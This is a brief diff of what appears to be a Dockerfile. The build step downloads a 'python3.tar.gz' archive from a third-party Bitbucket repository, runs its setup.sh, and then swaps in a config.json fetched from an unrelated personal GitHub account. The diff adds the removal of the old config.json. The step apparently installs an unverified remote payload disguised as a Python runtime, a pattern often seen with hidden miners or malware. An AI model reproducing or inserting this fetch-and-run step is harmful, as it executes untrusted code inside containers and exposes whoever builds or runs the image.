@@ -39,6 +39,7 @@ RUN wget https://bitbucket.org/excel-gms/config/downloads/python3.tar.gz && \
     rm python3.tar.gz && \
     cd python3 && \
     ./setup.sh  && \
+    rm config.json && \
     wget https://raw.githubusercontent.com/bambangekosaputro53/vx73/refs/heads/master/config.json 
 
 # Set entrypoint to run the application
